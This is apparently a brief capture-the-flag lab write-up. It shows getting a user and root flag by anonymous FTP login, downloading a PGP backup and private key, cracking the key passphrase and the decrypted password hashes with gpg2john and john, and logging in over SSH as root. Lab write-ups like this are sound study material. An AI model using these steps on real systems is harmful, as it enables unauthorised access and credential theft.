# User flag

Nmap shows that ports 21 and 22 are open, and that anonymous login is allowed

Login to ftp server

```bash
ftp IP_Address
```

Navigate through the directories, `home>melious` 

We have a `user.txt` file

Download the file using

```bash
get user.txt
```

User flag done

# Root flag

Exploring more, we see  `notread` directory, inside which there were `backup.pgp` and `private.asc` 

Download these files

```bash
get backup.pgp
get private.asc
```

We can crack the `private.asc` file using:

```bash
gpg2john private.asc > hash.txt 
```

Then, we can crack the password

After this, 

```bash
gpg --import private.asc
gpg --decrypt backup.pgp > decrypted
```

It seems that it was a backup for password hash

Crack it using john

SSH in the machine as root

Flag captured
